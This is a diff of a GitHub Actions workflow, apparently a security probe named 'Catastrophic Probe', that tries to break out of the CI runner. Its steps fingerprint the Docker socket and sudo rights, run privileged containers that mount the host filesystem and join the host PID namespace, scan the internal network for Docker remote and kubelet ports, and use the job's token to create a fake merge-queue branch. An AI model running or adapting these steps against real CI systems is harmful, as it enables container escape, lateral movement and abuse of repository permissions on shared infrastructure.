@@ -1,101 +1,54 @@
-name: Catastrophic Probe
+name: Cat Probe
 on: push
 jobs:
-  runner-escape:
+  escape:
     runs-on: ubuntu-latest
     steps:
-      - name: Runner environment fingerprint
+      - name: Kernel and Docker
         run: |
-          echo "=== KERNEL ==="
           uname -a
-          echo ""
-          echo "=== DOCKER SOCKET ==="
-          ls -la /var/run/docker.sock 2>&1 || echo "No docker socket"
-          docker info 2>&1 | head -20 || echo "Docker not accessible"
-          echo ""
-          echo "=== CONTAINER CHECK ==="
-          cat /proc/1/cgroup 2>/dev/null | head -10
-          cat /proc/self/mountinfo 2>/dev/null | grep -i "overlay\|docker\|containerd" | head -5
-          echo ""
-          echo "=== NETWORK INTERFACES ==="
-          ip addr show 2>/dev/null | grep "inet " || ifconfig 2>/dev/null | grep "inet "
-          echo ""
-          echo "=== LISTENING SERVICES ==="
-          ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
-          echo ""
-          echo "=== RUNNER USER PRIVILEGES ==="
+          echo "---"
+          ls -la /var/run/docker.sock 2>&1
+          echo "---"
+          docker info 2>&1 | head -5
+          echo "---"
           id
-          sudo -l 2>&1 | head -10
-          echo ""
-          echo "=== PROCESS TREE ==="
-          ps aux --forest 2>/dev/null | head -30 || ps aux | head -30
-          echo ""
-          echo "=== MOUNTED FILESYSTEMS ==="
-          mount | grep -v "proc\|sys\|cgroup\|tmpfs" | head -20
+          echo "---"
+          sudo -l 2>&1 | head -5
+          echo "---"
+          cat /proc/1/cgroup 2>/dev/null | head -5
 
-      - name: Docker escape attempt
+      - name: Docker Privileged
         run: |
-          echo "=== DOCKER PRIVILEGED TEST ==="
-          if command -v docker &> /dev/null; then
-            echo "Docker available. Testing privileged container..."
-            docker run --rm --privileged alpine id 2>&1 || echo "Privileged denied"
-            echo ""
-            echo "Testing host network..."
-            docker run --rm --network host alpine ip addr show 2>&1 | head -10 || echo "Host network denied"
-            echo ""
-            echo "Testing host PID namespace..."
-            docker run --rm --pid host alpine ps aux 2>&1 | head -10 || echo "Host PID denied"
-            echo ""
-            echo "Testing mount host filesystem..."
-            docker run --rm -v /:/hostfs alpine ls /hostfs/etc/hostname 2>&1 || echo "Host mount denied"
-            docker run --rm -v /:/hostfs alpine cat /hostfs/etc/hostname 2>&1 || echo "Cannot read host"
-          fi
+          docker run --rm --privileged alpine cat /proc/1/cgroup 2>&1 | head -3
+          echo "=HOSTFS="
+          docker run --rm -v /:/h alpine cat /h/etc/hostname 2>&1
+          echo "=HOSTPID="
+          docker run --rm --pid host alpine ps aux 2>&1 | head -5
 
-      - name: Network scan for co-located services
+      - name: Network
         run: |
-          echo "=== INTERNAL NETWORK SCAN ==="
-          # Get our IP and scan the local subnet
           MY_IP=$(hostname -I | awk '{print $1}')
-          echo "My IP: $MY_IP"
+          echo "IP=$MY_IP"
           SUBNET=$(echo $MY_IP | cut -d. -f1-3)
-          echo "Subnet: $SUBNET.0/24"
-          echo ""
-          echo "Scanning for common services..."
-          for port in 80 443 8080 8443 2375 2376 6443 10250 10255 4243; do
-            for host in "${SUBNET}.1" "${SUBNET}.2" "${SUBNET}.10" "172.17.0.1"; do
-              timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && echo "OPEN: $host:$port" &
-            done
-          done
-          wait
-          echo ""
-          echo "=== Docker bridge network ==="
-          ip route 2>/dev/null | head -5
-          echo ""
-          echo "=== DNS for internal services ==="
-          for name in "kubernetes" "docker" "registry" "actions-cache" "results"; do
-            result=$(dig +short $name 2>/dev/null)
-            [ -n "$result" ] && echo "DNS: $name -> $result"
-          done
+          echo "Subnet=$SUBNET"
+          ip route | head -5
+          echo "=GATEWAY="
+          timeout 2 bash -c "echo >/dev/tcp/${SUBNET}.1/80" 2>/dev/null && echo "GW:80 OPEN" || echo "GW:80 closed"
+          timeout 2 bash -c "echo >/dev/tcp/172.17.0.1/2375" 2>/dev/null && echo "DOCKER-REMOTE OPEN" || echo "Docker remote closed"
+          timeout 2 bash -c "echo >/dev/tcp/${SUBNET}.1/10250" 2>/dev/null && echo "KUBELET OPEN" || echo "Kubelet closed"
 
-      - name: Merge queue branch test
+      - name: Merge Queue Branch
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
-          echo "=== MERGE QUEUE BRANCH NAMING ==="
-          echo "Testing if we can pre-create merge queue branches..."
-          # GitHub merge queue branch pattern: gh-readonly-queue/<target>/<pr-info>
-          # Try creating a branch matching this pattern
-          SHA=$(git rev-parse HEAD 2>/dev/null || echo "$GITHUB_SHA")
-          
-          echo "Attempt: Create branch gh-readonly-queue/main/pr-999-$SHA"
-          curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
+          SHA=$GITHUB_SHA
+          RESP=$(curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
             -H "Accept: application/vnd.github+json" \
             "https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs" \
-            -d "{\"ref\":\"refs/heads/gh-readonly-queue/main/pr-999-$SHA\",\"sha\":\"$SHA\"}" | python3 -c "
+            -d "{\"ref\":\"refs/heads/gh-readonly-queue/main/pr-999-${SHA}\",\"sha\":\"${SHA}\"}")
+          echo "$RESP" | python3 -c "
 import json,sys
-d = json.load(sys.stdin)
-if 'ref' in d:
-    print(f'CRITICAL: Created merge queue branch: {d[\"ref\"]}')
-else:
-    print(f'Blocked: {d.get(\"message\",\"unknown\")[:200]}')
+d=json.load(sys.stdin)
+print('MERGE_QUEUE_BRANCH_CREATED' if 'ref' in d else f'BLOCKED: {d.get(\"message\",\"\")[:100]}')
 "
